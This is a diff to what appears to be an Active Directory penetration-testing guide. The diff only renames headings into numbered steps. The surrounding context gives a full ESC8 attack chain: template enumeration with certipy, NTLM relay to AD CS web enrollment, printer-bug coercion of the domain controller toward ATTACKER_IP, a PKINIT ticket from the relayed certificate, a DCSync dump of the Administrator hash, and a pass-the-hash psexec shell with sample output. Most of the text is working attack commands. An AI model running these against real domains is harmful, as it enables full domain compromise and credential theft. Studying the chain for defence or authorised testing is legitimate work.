@@ -5711,13 +5711,13 @@ ESC8—as described in the [`Certified Pre-Owned`](https://specterops.io/wp-cont
 
 Attackers can enumerate the certificate template which is used by Domain Controllers for authentication with tools like [`certipy`](https://github.com/ly4k/Certipy?tab=readme-ov-file), and use Impacket’s [`ntlmrelayx`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service.
 
-**Enumerate the certificate template**
+**Step 1: Use certipy to identify vulnerable certificate templates (e.g., `KerberosAuthentication`):**
 
 ```bash
 certipy find -u '<USER>@<corp.local>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabled -hide-admins
 ```
 
-**Run impacket-ntlmrelayx** 
+**Step 2: Set Up NTLM Relay** 
 
 ```bash
 impacket-ntlmrelayx -t http://<CA01_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
@@ -5727,7 +5727,7 @@ impacket-ntlmrelayx -t http://<CA01_IP>/certsrv/certfnsh.asp --adcs -smb2support
 
 Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the Printer Spooler service running. The command below forces **DC01_IP** to attempt authentication against **ATTACKER_IP**:
 
-**Run printerbug.py**
+**Step 3: Trigger Authentication (Printer Bug Exploit)**
 
 ```bash
 python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
@@ -5783,7 +5783,7 @@ Referring back to `ntlmrelayx`, we can see from the output that the authenticati
 We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).
 
 
-**Clone the repository and install the dependencies**
+**Step 4: Clone the repository and install the dependencies**
 
 ```bash
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
@@ -5795,7 +5795,7 @@ pip3 install -I git+https://github.com/wbond/oscrypto.git
 
 >Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
 
-**Run PKINIT (inside the .venv)**
+**Step 5: Request TGT with Pass-the-Certificate (inside the .venv)**
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
@@ -5818,7 +5818,7 @@ python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/
 
 Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example:
 
-**Retrieve the NTLM hash of the domain administrator account (inside the .venv)**
+**Step 6: Perform DCSync Attack (inside the .venv)**
 
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
@@ -5841,7 +5841,7 @@ impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<
 # [*] Cleaning up... 
 ```
 
-**Access the DC01's Administrator account using the Hash (inside the .venv)**
+**Step 7: Gain Shell Access (inside the .venv)**
 
 ```bash
 impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_IP>
@@ -5864,8 +5864,6 @@ impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_
 
 # C:\Windows\system32>
 ```
-
-
 
 </details>
 
